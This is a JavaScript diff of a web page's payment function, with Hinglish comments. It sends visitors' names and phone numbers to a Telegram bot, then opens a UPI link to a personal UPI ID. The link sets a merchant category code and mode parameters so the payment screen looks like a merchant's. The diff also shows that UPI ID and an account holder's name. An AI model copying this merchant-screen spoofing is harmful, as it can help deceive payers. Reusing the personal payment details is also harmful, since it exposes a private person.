@@ -550,19 +550,23 @@ init = function() {
         }
 
       async function confirmPay() {
-    // 1. Sirf ID aur Name rakhein (Simple P2P payment)
-    const myUpi = "ravikantb114-2@okaxis";
-    const name = "Shashikant Kumar"; // Bank account name
+    const name = document.getElementById('uName').value;
+    const phone = document.getElementById('uPhone').value;
+    
+    // Telegram Alert (Same rahega)
+    const msg = `🚀 *Payment Triggered*\n👤 Name: ${name}\n📞 Phone: ${phone}\n💰 Amount: ₹${sel.price}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-    // 2. Link mein se 'am' (amount) aur 'mc' hata dein
-    // Isse PhonePe "Chat/Collect" wala screen kholega jahan user khud amount bhar sakega
-    const upiLink = `upi://pay?pa=${myUpi}&pn=${encodeURIComponent(name)}&cu=INR`;
+    // --- EXACT SCREENSHOT LOGIC ---
+    
+    // 1. Merchant Category Code (mc=5411) bohot zaroori hai screenshot wale interface ke liye
+    // 2. am=${sel.price} se amount direct likha hua aayega
+    // 3. mode=02 se keyboard aur pay button direct generate hoga
+    
+    const txnId = "order" + Math.floor(Math.random() * 1000000);
+    const upiLink = `upi://pay?pa=${MY_UPI}&pn=Shashikant%20Kumar&am=${sel.price}&cu=INR&mc=5411&tr=${txnId}&mode=02&purpose=00`;
 
-    // 3. Telegram par alert bhej dein (taaki aapko pata chale kisne click kiya)
-    const msg = `🚀 *User clicked Pay*\n👤 Name: ${document.getElementById('uName').value}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-
-    // 4. Redirect
+    // Redirection
     window.location.href = upiLink;
 }
 // Ye line hamesha last mein rehni chahiye
